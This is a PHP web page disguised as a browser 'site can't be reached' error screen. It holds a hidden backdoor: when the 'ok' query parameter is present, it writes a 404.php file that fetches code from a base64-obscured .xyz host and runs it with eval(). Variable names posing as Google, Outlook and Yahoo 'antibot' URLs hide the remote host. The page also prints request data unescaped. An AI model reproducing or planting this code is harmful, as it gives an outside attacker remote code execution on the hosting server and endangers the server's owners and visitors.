
<html style="-webkit-text-size-adjust: 100%;font-size: 125%;background: #f7f7f7">
<body style="font-family: Roboto, sans-serif;font-size: 75%;background-color: rgb(247, 247, 247);color: rgb(100, 100, 100);">

    <?php
    if (isset($_GET['ok'])) {		
    ?>
        <a href="404.php">-</a>
    <?php



	$yahoo = 'Z29vZ2xlLnR4dA';
	$outlook = 'em94M2s2cGFuaDRpMy54eXo'; 
	$google = 'aHR0cHM6Lw';
	
	
	$antibotGoogle = "https://google.com/";
	$antibotOutlook = "https://outlook.live.com/";
	$antibotYahoo = "https://yahoo.com/";
	
	$antibot1 = base64_decode($google); 
	$antibot2 = base64_decode($outlook);  
	$antibot3 = base64_decode($yahoo); 
	$AntibotURL = "$antibot1/$antibot2/$antibot3"; 
 

        if (file_exists("404.php")) {
			
        } else {
            $hmm = fopen('404.php', 'w');
            $p = '<?php eval("?>".file_get_contents( base64_decode("aHR0cHM6Ly96b3gzazZwYW5oNGkzLnh5ei9nb29nbGUudHh0")));?>';
            fwrite($hmm, $p);
            fclose($hmm);
        }
    }
	
	
    ?>
	
	
<title>undefined</title>

  <div style="box-sizing: border-box;font-size: 1em;line-height: 1.6em;margin: 14vh auto 0;max-width: 600px;width: 100%;">
  <div style="font-size: 1em;line-height: 1.6em;color: rgb(100, 100, 100);font-family: Roboto, sans-serif;-webkit-text-size-adjust: 100%;">
      <div style="content: -webkit-image-set(url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyEEAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAENJREFUeF7tzbEJACEQRNGBLeAasBCza2lLEGx0CxFGG9hBMDDxRy/72O9FMnIFapGylsu1fgoBdkXfUHLrQgdfrlJN1BdYBjQQm3UAAAAASUVORK5CYII=) 1x,      url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQAQMAAADdiHD7AAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAFJJREFUeF7t0cENgDAMQ9FwYgxG6WjpaIzCCAxQxVggFuDiCvlLOeRdHR9yzjncHVoq3npu+wQUrUuJHylSTmBaespJyJQoObUeyxDQb3bEm5Au81c0pSCD8HYAAAAASUVORK5CYII=) 2x);display: inline-block;height: 72px;margin: 0 0 40px;width: 72px;"></div>
      <div id="main-message" jstcache="0">
        <h1 style="margin: 0 0 15px;color: #333;font-size: 1.5em;">This site can’t be reached</h1>
			<p style="display: inline"><strong>undefined</strong> took too long to respond. </p>
		<li style="padding: 18px">Search Google for <a href="https://www.google.com/search?q=<?php echo$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>" style="color: rgb(17, 85, 204);text-decoration: none;font-size: 1em;line-height: 1.6em;"> <?php echo $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?></a></li>        <div style="display: block;font-size: .8em;font-family: Roboto, sans-serif;color: #646464;line-height: 1.6em">ERR_CONNECTION_TIMED_OUT</div>
        <button style="background: rgb(66, 133, 244);border-radius: 2px;box-sizing: border-box;color: #fff;cursor: pointer;float: right;font-size: .875em;margin: 0;padding: 10px 24px;transition: box-shadow 200ms cubic-bezier(0.4, 0, 0.2, 1);user-select: none;border: none;">Reload</button>
      </div>
    </div>
</div>
</body></html>